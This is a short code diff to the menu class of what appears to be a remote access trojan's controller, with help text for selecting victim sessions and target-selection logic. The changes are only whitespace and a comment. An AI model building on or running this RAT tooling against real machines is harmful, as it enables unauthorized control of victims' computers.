@@ -40,7 +40,6 @@ class Menu:
 
  -t session_id  or --target session_id : Selects a session (client) to be able to execute commands (mod session). 
 
-
  -cde or --connectionDisplayEnable : Activate the display of client information (Logoff and incoming connection).
 
  -cdd or --connectionDisplayDisable : Disables the display of client information (Logoff and incoming connection).
@@ -62,7 +61,7 @@ class Menu:
 
     def selectTarget(self,target):    
         #Select target.
-        #session, socket, ip, port, is_he_alive, is_he_admin, path_RAT, username, token
+        #session, socket, ip, port, is_he_alive, is_he_admin, path_RAT, username, token        
         '''
         When the server(menu) selects the victim, the victim is considered dead in Handler.dict_conn (False).
         This serves to avoid confusion when sending data. 
@@ -113,6 +112,7 @@ class Menu:
                 break
 
             printColor("help","[?] Command execute: {}\n".format(choice))
+
             for i in range(0,len(choice)):
 
                 if(choice[i] == "--help" or choice[i] == "-h"):
